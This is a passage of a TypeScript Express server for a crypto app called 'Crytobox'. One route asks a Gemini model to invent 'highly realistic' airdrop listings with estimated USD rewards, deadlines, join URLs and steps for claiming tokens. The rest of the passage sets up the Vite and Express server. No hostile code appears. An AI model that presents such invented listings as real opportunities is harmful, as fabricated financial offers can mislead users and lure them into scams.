        "Complete daily task boards to secure ecosystem rank multiplier multipliers."
      ],
      requirements: [
        "Web3 Browser Wallet",
        "At least $10 in native gas balances",
        "Discord verification status"
      ]
    };
    return res.json(mockAirdrop);
  }

  try {
    const prompt = `Generate a highly realistic and professional cryptocurrency testnet or mainnet airdrop discovery detail object for a Web3 project named "${projectName}". 
    The blockchain should be: "${blockchain || "Ethereum"}" and category: "${category || "defi"}".
    Provide custom step-by-step guidance on how users can secure potential tokens.
    Respond in STRICT JSON matching this schema:
    {
      "name": "Project Name",
      "logo": "Single emoji as logo (e.g., 🦄, 🦊, 🟢, 🚀)",
      "description": "Short engaging 2-sentence description of the project and its network rewards.",
      "reward": "Range of estimated reward in USD, e.g. '$100-$500', '$500-$1000', or '$1000+'",
      "difficulty": "Easy, Medium, or Hard",
      "timeRemaining": "String like '15 days left' or '45 days left'",
      "blockchain": "The requested blockchain network",
      "joinUrl": "The mock official website URL like https://projectname.io",
      "category": "category ID like defi, layer-2, nfts, or socialfi",
      "detailedSteps": ["Step 1 description", "Step 2 description", "Step 3 description", "Step 4 description"],
      "requirements": ["Requirement 1", "Requirement 2"]
    }`;

    const response = await client.models.generateContent({
      model: "gemini-3.5-flash",
      contents: prompt,
      config: {
        responseMimeType: "application/json",
        temperature: 0.7
      }
    });

    const text = response.text?.trim() || "{}";
    const generatedData = JSON.parse(text);
    res.json(generatedData);
  } catch (err: any) {
    console.error("Gemini AI generation failed", err);
    res.status(500).json({ error: "Failed to generate AI airdrop. Service is busy, please try again." });
  }
});


// --- VITE MIDDLEWARE SETUP FOR DEV/PROD ---

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    // SPA fallback route
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`[Crytobox Fullstack] Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
